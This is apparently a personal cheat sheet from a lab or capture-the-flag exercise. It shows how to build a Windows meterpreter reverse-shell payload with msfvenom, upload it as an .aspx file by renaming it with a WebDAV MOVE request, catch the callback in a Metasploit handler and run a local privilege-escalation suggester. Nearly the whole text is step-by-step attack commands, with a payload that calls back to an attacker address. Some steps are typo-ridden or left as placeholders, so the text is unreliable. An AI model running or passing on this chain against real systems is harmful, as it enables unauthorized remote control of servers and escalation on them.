# Use MSFVENOM to create reverse shell payload

1. Create a reverse shell payload

```
msfvenom --list-formats
...
msfvenom --help-formats
...
msfvenom -p wiondows/meterpreter/reverse_tcp LHOST=10.10.10.66 LPORT=1337 -f aspx
```

2. Take the output and save to a file to upload to target.

```
curl put to target
```


3. start the meterpreter handler

```
msfconsole
msf> use exploit/multi/handler
(handler)> set LHOST tun0
(handler)> set LHOST tun0
(handler)> set LPORT 1337
(handler)> set payload windows/meterpreter/reverse_tcp
(handler)> exploit -j
```

4. Use the HTTP move method

``` 
MOVE /revshell.html HTTP/1.1
Destination: /revshell.aspx
TE: deflate,gzip:1=0.3
Conection: close
Host: localhost:80
User-Agent: DAV.p,/v.0.48
Content-Length: 2793
```

5. Go back to msfconsole

```
(handler)> search suggester
(handler)> sessions -i 1
meterpreter> shell
C:\>whoami
...
C:\>exit
(handler)> use post/multi/recon/local_exploit_suggester
(handler)> set SESSIONS 1
(handler)> set SESSION 1
(handler)> run
...
```



```

